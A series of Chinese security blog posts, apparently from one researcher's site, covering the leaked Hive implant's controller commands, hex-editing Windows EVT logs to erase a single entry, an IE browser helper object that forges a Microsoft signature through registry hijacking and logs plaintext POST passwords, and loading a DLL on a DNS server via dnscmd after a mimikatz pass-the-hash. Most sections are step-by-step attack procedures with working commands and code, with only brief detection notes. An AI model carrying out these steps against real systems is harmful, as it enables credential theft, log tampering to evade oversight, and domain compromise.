<h4 id="honeycomb">Honeycomb：</h4>

<p>实际控制端，该部分的详细配置说明缺失</p>

<p>提供给用户操作的界面程序为<code class="language-plaintext highlighter-rouge">Cutthroat</code></p>

<h4 id="cutthroat">Cutthroat：</h4>

<p>相当于木马控制端，发送控制命令</p>

<p>可使用以下目录的不同版本：</p>

<ul>
  <li>hive\snapshot_20141217-1052\clientDirectory</li>
  <li>hive\snapshot_20141107-1345\clientDirectory</li>
  <li>hive\snapshot_20141017-1409\clientDirectory</li>
</ul>

<p>启动方式：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./cutthroat hive
</code></pre></div></div>

<p>如果控制台回显success，代表加载成功</p>

<p>详细配置可参考：</p>

<p><code class="language-plaintext highlighter-rouge">\hive\documentation\UsersGuide\UsersGuide.odt</code>,  <code class="language-plaintext highlighter-rouge">3.4 	(U) Command and Control Client</code></p>

<p>使用版本<code class="language-plaintext highlighter-rouge">snapshot_20141217-1052\clientDirectory</code>会报错，返回</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./hive: undefined symbol: debug_print_buffer
[local failure] Failed to load hive [load]
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-12/4-3.png" alt="Alt text"></p>

<p>换另一个测试版本<code class="language-plaintext highlighter-rouge">snapshot_20141107-1345/ctDirectory</code></p>

<p>返回</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[success] Successfully loaded hive [load]
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-12/4-4.png" alt="Alt text"></p>

<p>按下<code class="language-plaintext highlighter-rouge">Tab</code>键能够获得可用的命令</p>

<p>通信上分为两种模式：</p>

<p><strong>主动连接：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ilm connect &lt;triggerFileName&gt;
</code></pre></div></div>

<p>用于主动连接服务器上的后门</p>

<p><strong>被动连接：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ilm listen &lt;port&gt;
</code></pre></div></div>

<p>当成功与Client建立连接后，支持如下操作：</p>

<ul>
  <li>cmd exec</li>
  <li>file put</li>
  <li>file get</li>
  <li>ilm exit</li>
  <li>quit</li>
  <li>shutdown now</li>
  <li>shell open</li>
</ul>

<h2 id="0x04-其他工具">0x04 其他工具</h2>
<hr>

<h3 id="1hivereset_v1_0py">1、hiveReset_v1_0.py</h3>

<p>位于<code class="language-plaintext highlighter-rouge">\hive\ilm-client\resetTimer_v1.0\delivery_1Oct2012</code></p>

<p>用于更新木马客户端</p>

<h3 id="2chimay-red">2、Chimay-Red</h3>

<p>未公开</p>

<p>针对MikroTik MIPS RouterOS 6.x的远程利用工具，能够远程植入Hive</p>

<p>相关说明：</p>

<p>https://wikileaks.org/ciav7p1/cms/page_16384604.html</p>

<h3 id="3mealybug">3、Mealybug</h3>

<p>未公开</p>

<p>针对AVTech Network Video Recorders的远程利用工具，能够远程植入Hive</p>

<h2 id="0x05-综合分析">0x05 综合分析</h2>
<hr>

<p>对于维基解密这次公布的Vault8文档，不包含漏洞利用工具和相关POC</p>

<p>Hive作为一款远程控制工具，支持多个操作系统，包括Windows(Server 2003)、Linux(x86/x64)、Solaris(sparc/x86)、MikroTik(MIPS/PowerPC/Intelx86)、Ubiquiti (MIPS)和AVTech NVRs(AVTech ARM)</p>

<p>在隐蔽性上下足了功夫，通过流量分发的方式隐蔽实际的控制服务器地址，使用伪造的卡巴斯基实验室证书进行通信</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on November 12, 2017
  </div>

  
</article><article class="post">
  <h1>Windows Event Viewer Log (EVT)单条日志清除（一）——删除思路与实例</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>Windows Event Viewer Log (EVT)单条日志清除系列文章的第一篇，侧重于介绍evt日志文件的基础知识和删除单条日志的实现思路与实例</p>

<p>Windows Event Viewer Log (EVT)适用于以下Windows系统:</p>

<ul>
  <li>Windows NT 4</li>
  <li>Windows 2000</li>
  <li>Windows XP</li>
  <li>Windows 2003</li>
</ul>

<p><strong>注：</strong></p>

<p>之前介绍了Windows XML Event Log (EVTX)适用于Win7及更高版本的系统</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>evt文件格式</li>
  <li>删除单条日志的思路</li>
  <li>删除单条日志的实例</li>
</ul>

<h2 id="0x02-基础知识">0x02 基础知识</h2>
<hr>

<p>evt文件格式指Windows Vista之前用于保存系统日志信息的文件，最常见的为XP和Server2003系统</p>

<p>日志文件默认保存位置： <code class="language-plaintext highlighter-rouge">%systemroot%\system32\config</code></p>

<p>常见日志文件：</p>

<ul>
  <li>应用程序日志：AppEvent.Evt</li>
  <li>安全日志：SecEvent.Evt</li>
  <li>系统日志：SysEvent.Evt</li>
</ul>

<h3 id="查看日志的方法">查看日志的方法</h3>

<h4 id="1-通过界面">(1) 通过界面</h4>

<p><code class="language-plaintext highlighter-rouge">cmd</code> -&gt; <code class="language-plaintext highlighter-rouge">eventvwr</code></p>

<h4 id="2-通过命令行">(2) 通过命令行</h4>

<p>查询系统日志并输出详细信息：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cscript c:\windows\system32\eventquery.vbs /l system /v
</code></pre></div></div>

<p>查询指定时间(2017.12.05,01:00:00AM至2018.01.02,10:00:00AM)之间的系统日志：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cscript c:\windows\system32\eventquery.vbs /l system /fi "Datetime eq 12/05/2017,01:00:00AM-01/02/2018,10:00:00AM"
</code></pre></div></div>

<p>官方参数说明：</p>

<p>https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-xp/bb490900(v=technet.10)</p>

<h3 id="evt文件格式">evt文件格式</h3>

<p>参考资料：</p>

<p>https://github.com/libyal/libevt/blob/master/documentation/Windows%20Event%20Log%20(EVT)%20format.asciidoc</p>

<p>evt文件结构包含三部分：</p>

<ul>
  <li>file header</li>
  <li>event records</li>
  <li>end of file record</li>
  <li>trailing empty values</li>
</ul>

<p><strong>注：</strong></p>

<p>file header保存evtx文件基本信息，值得注意的是<code class="language-plaintext highlighter-rouge">End of file record offset</code>，<code class="language-plaintext highlighter-rouge">Last (newest) record number</code>和<code class="language-plaintext highlighter-rouge">Maximum file size</code></p>

<p>event records对应每条日志的内容，值得注意的是<code class="language-plaintext highlighter-rouge">Record number</code></p>

<p>end of file record固定结构，值得注意的是<code class="language-plaintext highlighter-rouge">End of file record offset</code>和<code class="language-plaintext highlighter-rouge">Last (newest) record number</code></p>

<p>trailing empty values为尾随空值，用于填充文件长度，内容任意，不会影响evtx文件的有效性</p>

<h4 id="1-file-header">(1) file header</h4>

<p>格式可参考：</p>

<p>https://github.com/libyal/libevt/blob/master/documentation/Windows%20Event%20Log%20(EVT)%20format.asciidoc#2-file-header</p>

<p>前48位，没有校验和标志位</p>

<p>以下五项需要配置正确：</p>

<ul>
  <li>First (oldest) record offset</li>
  <li>End of file record offset</li>
  <li>Last (newest) record number</li>
  <li>First (oldest) record number</li>
  <li>Maximum file size</li>
</ul>

<h4 id="2-event-records">(2) event records</h4>

<p>格式可参考：</p>

<p>https://github.com/libyal/libevt/blob/master/documentation/Windows%20Event%20Log%20(EVT)%20format.asciidoc#3-event-record</p>

<p>修改Record number(即使重复)不影响日志文件的正常识别</p>

<h4 id="3-end-of-file-record">(3) end of file record</h4>

<p>格式可参考：</p>

<p>https://github.com/libyal/libevt/blob/master/documentation/Windows%20Event%20Log%20(EVT)%20format.asciidoc#4-end-of-file-record</p>

<p>同file header，以下四项需要配置正确：</p>

<ul>
  <li>First (oldest) record offset</li>
  <li>End of file record offset</li>
  <li>Last (newest) record number</li>
  <li>First (oldest) record number</li>
</ul>

<h2 id="0x03-删除思路">0x03 删除思路</h2>
<hr>

<p>由于evt文件不存在校验值，所以我们在删除单条日志时可以使用以下流程：</p>

<ul>
  <li>直接删除某条日志的内容</li>
  <li>后面日志更新Record number(减1)</li>
  <li>更新file header中的五项</li>
  <li>同步更新end of file record中的四项</li>
</ul>

<h2 id="0x04-删除实例">0x04 删除实例</h2>
<hr>

<p>查看日志：</p>

<p><code class="language-plaintext highlighter-rouge">cmd</code> -&gt; <code class="language-plaintext highlighter-rouge">eventvwr</code></p>

<p>获得system项下共有9条日志，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-7-5/2-1.png" alt="Alt text"></p>

<p>选中<code class="language-plaintext highlighter-rouge">System</code>，右键，选择<code class="language-plaintext highlighter-rouge">Save Log File As...</code>，将日志文件保存为sys1.evt</p>

<p><strong>注：</strong></p>

<p>复制<code class="language-plaintext highlighter-rouge">%systemroot%\system32\config</code>下的文件SysEvent.Evt，得到的日志文件无法正常打开</p>

<p>原因：</p>

<p><code class="language-plaintext highlighter-rouge">%systemroot%\system32\config</code>下evt文件的file header未同步更新，导致打开evt文件时格式出现错误</p>

<p>修复file header后，文件能够正常打开</p>

<p>sys1.evt已上传，下载地址：</p>

<p>https://github.com/3gstudent/Eventlogedit-evt–General/blob/master/sys1.evt</p>

<p>在eventvwr中打开该日志，Log Type选择<code class="language-plaintext highlighter-rouge">System</code>,成功打开</p>

<p>文件包含9条日志，下面尝试删除第5条日志，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-7-5/2-2.png" alt="Alt text"></p>

<h3 id="1定位第5条日志">1、定位第5条日志</h3>

<p>搜索<code class="language-plaintext highlighter-rouge">4c664c6505000000</code></p>

<p><code class="language-plaintext highlighter-rouge">4c664c65</code>为ELF_LOG_SIGNATURE，固定结构</p>

<p><code class="language-plaintext highlighter-rouge">05000000</code>为Record number</p>

<h3 id="2删除第5条日志">2、删除第5条日志</h3>

<p>起始位置为<code class="language-plaintext highlighter-rouge">4c664c6505000000</code>的之前的4字节</p>

<p>删除长度为<code class="language-plaintext highlighter-rouge">4c664c6505000000</code>的之前的4字节</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-7-5/3-1.png" alt="Alt text"></p>

<p>起始位置为<code class="language-plaintext highlighter-rouge">0x320h</code></p>

<p>删除长度为<code class="language-plaintext highlighter-rouge">0x00000070h</code>(即<code class="language-plaintext highlighter-rouge">112</code>)</p>

<p><strong>补充：</strong></p>

<p>通过UltraEdit实现的操作：</p>

<p>选中起始位置为<code class="language-plaintext highlighter-rouge">0x320h</code>，右键，选择<code class="language-plaintext highlighter-rouge">十六进制插入/删除</code></p>

<p>选择<code class="language-plaintext highlighter-rouge">删除</code>，填入删除字节数<code class="language-plaintext highlighter-rouge">112</code></p>

<h3 id="3后面日志更新record-number减1">3、后面日志更新Record number(减1)</h3>

<p>即第6、7、8和9条日志的Record number</p>

<h3 id="4更新file-header中的三项">4、更新file header中的三项</h3>

<h4 id="1-end-of-file-record-offset">(1) End of file record offset</h4>

<p>位于File header偏移20的4字节</p>

<p>保存的内容为end of file record的起始地址</p>

<p>两种计算方法：</p>

<ol>
  <li>原偏移地址-第5条日志的长度(112)</li>
  <li>定位end of file record，直接获得</li>
</ol>

<p>新的End of file record offset为<code class="language-plaintext highlighter-rouge">0x00000640h</code></p>

<h4 id="2-last-newest-record-number">(2) Last (newest) record number</h4>

<p>位于File header偏移24的4字节</p>

<p>数值减1，由<code class="language-plaintext highlighter-rouge">0x0000000A</code>变为<code class="language-plaintext highlighter-rouge">0x00000009</code></p>

<h4 id="3-maximum-file-size">(3) Maximum file size</h4>

<p>位于File header偏移32的4字节</p>

<p>新的Maximum file size为<code class="language-plaintext highlighter-rouge">0x00000668h</code></p>

<h3 id="5同步更新end-of-file-record中的两项">5、同步更新end of file record中的两项</h3>

<ul>
  <li>End of file record offset</li>
  <li>Last (newest) record number</li>
</ul>

<p>修改后保存为新文件sys2.evt</p>

<p>下载地址：</p>

<p>https://github.com/3gstudent/Eventlogedit-evt–General/blob/master/sys2.evt</p>

<p>成功删除第5条日志</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-7-5/3-2.png" alt="Alt text"></p>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文介绍了evt日志文件的基础知识和删除单条日志的实现思路，实例演示如何修改evt文件，隐藏其中一条日志</p>

<p>下一篇将要按照之前的研究思路，介绍如何编写程序实现自动删除指定日期的日志</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on July  5, 2018
  </div>

  
</article><article class="post">
  <h1>利用BHO实现IE浏览器劫持</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>本文源于一个隐蔽连接的测试，模拟IE浏览器发起网络连接，能绕过某些防护产品拦截发起网络连接的第三方程序</p>

<p>模拟IE浏览器发起网络连接的方法有很多种，其中，利用BHO劫持IE浏览器存在诸多优点(开放接口、简单高效、功能丰富等)，所以本文将要介绍BHO的开发和劫持利用思路</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>BHO简介</li>
  <li>开发BHO</li>
  <li>利用思路</li>
  <li>实际测试</li>
  <li>防御</li>
</ul>

<h2 id="0x02-bho简介">0x02 BHO简介</h2>
<hr>

<p>BHO，全称Browser Helper Object(浏览器辅助对象)</p>

<p>微软推出的作为浏览器对第三方程序员开放交互接口的业界标准</p>

<p>BHO的作用：</p>

<ul>
  <li>获取浏览器行为，如“后退”、“前进”、“当前页面”等</li>
  <li>控制浏览器行为，如修改替换浏览器工具栏，添加自己的程序按钮等</li>
</ul>

<p>BHO依托于浏览器主窗口, 与浏览器实例生命周期一致，即浏览器页面打开时BHO对象运行，页面关闭时随之结束</p>

<p>使用BHO时需要注册，相当于写入注册表，位于<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper\ Objects\{GUID}</code>和<code class="language-plaintext highlighter-rouge">HKEY_CLASSES_ROOT\CLSID\{GUID}</code></p>

<h2 id="0x03-开发bho">0x03 开发BHO</h2>
<hr>

<p>本节仅作简要介绍</p>

<p>开发工具： VS2012</p>

<h3 id="1生成dll">1、生成dll</h3>

<p><code class="language-plaintext highlighter-rouge">新建</code>-<code class="language-plaintext highlighter-rouge">Visual C++</code>-<code class="language-plaintext highlighter-rouge">ATL</code></p>

<p><code class="language-plaintext highlighter-rouge">添加</code>-<code class="language-plaintext highlighter-rouge">类</code>-<code class="language-plaintext highlighter-rouge">ATL</code>-<code class="language-plaintext highlighter-rouge">ATL简单对象</code>，设定简称为<code class="language-plaintext highlighter-rouge">HelloWorldBHO</code>，选中<code class="language-plaintext highlighter-rouge">IObjectWithSite(IE对象支持)</code></p>

<p>修改以下文件：</p>

<ul>
  <li>HelloWorldBHO.h</li>
  <li>HelloWorldBHO.cpp</li>
  <li>dllmain.cpp</li>
  <li>HelloWorld.rgs</li>
</ul>

<p><strong>注：</strong></p>

<p>详情可参考http://blog.csdn.net/feier7501/article/details/11266345</p>

<p>helloworld.rgs内保存BHO的GUID，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-28/2-1.png" alt="Alt text"></p>

<p>HelloWorldBHO.rgs内保存BHO的名称，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-28/2-2.png" alt="Alt text"></p>

<p>helloworld.rc内的<code class="language-plaintext highlighter-rouge">CompanyName</code>代表发行者，<code class="language-plaintext highlighter-rouge">PRODUCTVERSION</code>代表版本，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-28/2-3.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>以上三个图对应下文加载项的显示信息</p>

<p>HelloWorldBHO.cpp保存IE浏览器中不同事件对应的操作，这里仅介绍一段实例代码(详细代码参照开源工程)，实现当页面加载完成时，弹框显示当前URL，关键代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>void STDMETHODCALLTYPE CHelloWorldBHO::OnDocumentComplete(IDispatch *pDisp, VARIANT *pvarURL)  
{  
    BSTR url = pvarURL-&gt;bstrVal;
	CComBSTR u(url);
	// Retrieve the top-level window from the site.  
    HWND hwnd;  
    HRESULT hr = m_spWebBrowser-&gt;get_HWND((LONG_PTR*)&amp;hwnd);  
    if (SUCCEEDED(hr))  
    {  
        MessageBox(0, u, L"the url is", MB_OK);
    }  
} 
</code></pre></div></div>

<p>编译生成helloworld.dll</p>

<p><strong>注：</strong></p>

<p>如果VS2012不是管理员权限，编译时提示无法注册，接下来可以手动注册</p>

<h3 id="2注册dll">2、注册dll</h3>

<p>需要管理员权限，命令如下:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>regsve32 helloworld.dll /s
</code></pre></div></div>

<p><strong>注：</strong></p>

<p><code class="language-plaintext highlighter-rouge">/s</code>参数用来去掉注册成功的提示框</p>

<p>相当于写入注册表，位于<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper\ Objects\{GUID}</code>和<code class="language-plaintext highlighter-rouge">HKEY_CLASSES_ROOT\CLSID\{GUID}</code></p>

<p><strong>补充：</strong></p>

<p>卸载dll：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>regsve32 helloworld.dll /s /u
</code></pre></div></div>

<p>或者删除对应的注册表键值</p>

<h2 id="0x04-实际测试">0x04 实际测试</h2>
<hr>

<p>测试系统： Win 7x86 IE8</p>

<p>打开IE浏览器，弹出对话框，显示当前URL，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-28/3-1.png" alt="Alt text"></p>

<p>查看IE的加载项，位于<code class="language-plaintext highlighter-rouge">工具</code>-<code class="language-plaintext highlighter-rouge">管理加载项</code>，获得加载项信息，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-28/3-2.png" alt="Alt text"></p>

<p>其中的名称、发行者、版本可通过前文的helloworld.rgs、HelloWorldBHO.rgs、helloworld.rc指定，文件日期对应dll的修改时间</p>

<p>由于我们自己生成的dll没有微软签名，所以显示<code class="language-plaintext highlighter-rouge">未验证</code></p>

<h2 id="0x05-利用思路">0x05 利用思路</h2>
<hr>

<h3 id="1伪造微软签名隐藏bho">1、伪造微软签名，隐藏BHO</h3>

<p>向helloworld.dll添加微软的Authenticode签名，修改注册表劫持系统的签名验证功能，使签名生效</p>

<p>可参考之前的文章： <a href="https://3gstudent.github.io/3gstudent.github.io/Authenticode%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0-PE%E6%96%87%E4%BB%B6%E7%9A%84%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0%E4%B8%8E%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81%E5%8A%AB%E6%8C%81/">《Authenticode签名伪造——PE文件的签名伪造与签名验证劫持》</a></p>

<p>需要使用Microsoft Corporation的签名，可在Office文件中获得，可用的路径： <code class="language-plaintext highlighter-rouge">C:\Program Files\Microsoft Office\Office14\URLREDIR.DLL</code></p>

<p>使用SigThief添加签名，下载地址：</p>

<p>https://github.com/secretsquirrel/SigThief</p>

<p>参数：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sigthief.py -i "C:\Program Files\Microsoft Office\Office14\URLREDIR.DLL" -t helloworld.dll -o new.dll 
</code></pre></div></div>

<p>生成new.dll</p>

<p>修改注册表，劫持签名签证功能：
(管理员权限)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\Windows\System32\ntdll.dll" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "DbgUiContinue" /f
</code></pre></div></div>

<p>注册dll，重新打开IE，查看加载项，验证通过，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-28/3-3.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>修改BHO的信息能够进一步隐藏BHO</p>

<h3 id="2抓取浏览器post数据记录明文口令">2、抓取浏览器POST数据，记录明文口令</h3>

<p>抓取浏览器POST数据的开源代码可从github获得，参考地址：</p>

<p>https://github.com/liigo/bho</p>

<p>在BeforeNavigate2事件前抓取浏览器的POST数据</p>

<p>我在自己的工程中直接引用了其中的关键函数： <code class="language-plaintext highlighter-rouge">STDMETHODIMP CBhoApp::Invoke(DISPID dispidMember, REFIID riid, LCID lcid, WORD wFlags, DISPPARAMS *pDispParams, VARIANT *pvarResult, EXCEPINFO *pExcepInfo, UINT *puArgErr)</code></p>

<p>添加函数声明，实现记录日志的功能</p>

<p><strong>注：</strong></p>

<p>GetTempPath获取当前系统的Temp目录，IE权限下实际的路径为<code class="language-plaintext highlighter-rouge">%Temp%\Low</code></p>

<p>完整代码已开源，地址如下：</p>

<p>https://github.com/3gstudent/IE-BHO-POSTdata-Logger</p>

<p>抓取浏览器POST数据，能够获得用户输入的明文口令，例如github的登录密码，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-28/3-4.png" alt="Alt text"></p>

<h3 id="3下载文件">3、下载文件</h3>

<p>通过这种方式下载文件，防火墙软件的管理端显示下载文件的程序为IE浏览器，能够在一定程度上实现隐藏</p>

<h3 id="4在ie页面注入js">4、在IE页面注入js</h3>

<p>可参考以下开源工程做进一步修改：</p>

<p>https://github.com/xiyiaoo/BHO</p>

<p>本文不做进一步介绍</p>

<h3 id="5补充">5、补充</h3>

<p>默认BHO的权限为low，所以在操作上会有一些限制，如果通过其他方式获得了高权限，那么可供利用的方式会更多</p>

<h2 id="0x06-防御检测">0x06 防御检测</h2>
<hr>

<p><strong>防御：</strong></p>

<p>BHO利用的前提是需要获得系统的管理员权限</p>

<p><strong>检测：</strong></p>

<ul>
  <li>查看IE浏览器中的加载项</li>
  <li>查看IE进程加载的dll</li>
</ul>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文介绍了IE浏览器辅助对象BHO的开发方法，分析了在获得系统管理员权限后的利用思路，部分利用技术点到为止</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on December 28, 2017
  </div>

  
</article><article class="post">
  <h1>域渗透——利用dnscmd在DNS服务器上实现远程加载Dll</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>由Shay Ber公开的一个利用方法，在域环境中，使用DNSAdmin权限能够在DNS服务器上实现远程加载Dll。这不算漏洞，但可以作为一个域渗透的技巧，本文将结合自己的经验整理这个利用技巧，添加自己的理解，对照利用思路给出防御建议。</p>

<p>参考资料：</p>

<p>https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>详细利用方法</li>
  <li>防御思路</li>
</ul>

<h2 id="0x02-详细利用方法">0x02 详细利用方法</h2>
<hr>

<h4 id="利用条件">利用条件：</h4>

<p>已获得域内DnsAdmins，Domain Admins或者Enterprise Admins组内用户的口令或者hash</p>

<p><strong>注：</strong></p>

<p>默认配置下，不仅仅是DnsAdmins组内的用户，Domain Admins或者Enterprise Admins组内的用户也可以</p>

<h3 id="1查看关键组内的用户">1、查看关键组内的用户</h3>

<p>查看所有的组：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net group /domain
</code></pre></div></div>

<p>查看DnsAdmins组内的用户：</p>

<p>无法使用<code class="language-plaintext highlighter-rouge">net group</code>命令查看，可以使用<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a>查看</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import-module .\PowerView.ps1
Get-NetGroupMember -GroupName "DNSAdmins"
</code></pre></div></div>

<p>查看Domain Admins组内的用户：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net group "Domain Admins" /domain
</code></pre></div></div>

<p>查看Enterprise Admins组内的用户：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net group "Enterprise Admins" /domain
</code></pre></div></div>

<h3 id="2获得关键用户的口令或者hash">2、获得关键用户的口令或者hash</h3>

<p>需要获得DnsAdmins，Domain Admins或者Enterprise Admins组内任一用户的口令或者hash</p>

<h3 id="3准备payloaddll">3、准备Payload.dll</h3>

<p>需要定义三个导出函数：</p>

<ul>
  <li>DnsPluginInitialize</li>
  <li>DnsPluginCleanup</li>
  <li>DnsPluginQuery</li>
</ul>

<p>定义导出函数可以参考之前开源的工程：</p>

<p>https://github.com/3gstudent/Add-Dll-Exports</p>

<p>这里使用def文件的方式声明导出函数，测试代码如下：</p>

<p>dllmain.cpp：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DWORD WINAPI DnsPluginInitialize(PVOID a1, PVOID a2)
{
	return 0;
}

DWORD WINAPI DnsPluginCleanup()
{
	return 0;
}

DWORD WINAPI DnsPluginQuery(PVOID a1, PVOID a2, PVOID a3, PVOID a4)
{
	WinExec("calc.exe", SW_SHOWNORMAL);
	return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
</code></pre></div></div>

<p>.def文件：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>EXPORTS
DnsPluginInitialize
DnsPluginCleanup
DnsPluginQuery
</code></pre></div></div>

<p>编译生成testdns.dll</p>

<h3 id="4payloaddll保存的位置">4、Payload.dll保存的位置</h3>

<p>需要能被DNS服务器远程访问</p>

<p>这里可以使用域内共享文件夹SYSVOL，默认所有的域用户都能访问</p>

<p>更多细节可参考之前的文章：<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">《域渗透——利用SYSVOL还原组策略中保存的密码》</a></p>

<p>我的测试域环境名称为test.com，使用的域内共享文件夹路径为：<code class="language-plaintext highlighter-rouge">\\test.com\SYSVOL\test.com\scripts\testdns.dll</code></p>

<h3 id="5准备dnsadmin">5、准备dnsadmin</h3>

<p>通常，域内的Windows主机不支持dnsadmin命令</p>

<p>默认安装的系统：</p>

<ul>
  <li>Windows Server 2003</li>
  <li>Windows Server 2008</li>
  <li>Windows Server 2003 R2</li>
  <li>Windows Server 2008 R2</li>
  <li>Windows Server 2012</li>
  <li>Windows Server 2003 with SP1</li>
  <li>…</li>
</ul>

<p>参考资料：</p>

<p>https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc772069(v=ws.11)</p>

<p>Win7系统在使用时需要安装Remote Server Administration Tools (RSAT)</p>

<p>这里介绍在未安装Remote Server Administration Tools (RSAT)的系统上执行dnscmd命令的方法：</p>

<h4 id="1将dnscmdexe保存在cwindowssystem32下">(1)将dnscmd.exe保存在C:\Windows\System32下</h4>

<p>可用下载地址:</p>

<p>https://github.com/3gstudent/test/blob/master/dnscmd.exe</p>

<h4 id="2将dnscmdexemui保存在cwindowssystem32en-us下">(2)将dnscmd.exe.mui保存在C:\Windows\System32\en-US下</h4>

<p>可用下载地址:</p>

<p>https://github.com/3gstudent/test/blob/master/dnscmd.exe.mui</p>

<p><strong>注：</strong></p>

<p>dnscmd.exe和dnscmd.exe.mui是在我的测试系统(Windows Server 2008 R2x64)中获得的</p>

<p>方法细节可参考之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DNS%E8%AE%B0%E5%BD%95%E7%9A%84%E8%8E%B7%E5%8F%96/">《域渗透——DNS记录的获取》</a></p>

<h3 id="6启动dnscmd">6、启动dnscmd</h3>

<p>dnscmd不支持输入凭据进行远程操作的功能，这里需要使用mimikatz的Over pass the hash功能</p>

<p>测试环境已获得关键用户的信息如下：</p>

<p>用户名：Administrator
口令：DomainAdmin456!
hash：A55E0720F0041193632A58E007624B40</p>

<p>命令行下执行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug "sekurlsa::pth /user:Administrator /domain:test.com /ntlm:A55E0720F0041193632A58E007624B40"
</code></pre></div></div>

<p>这样会弹出一个cmd.exe，在cmd.exe中执行dnscmd命令即可</p>

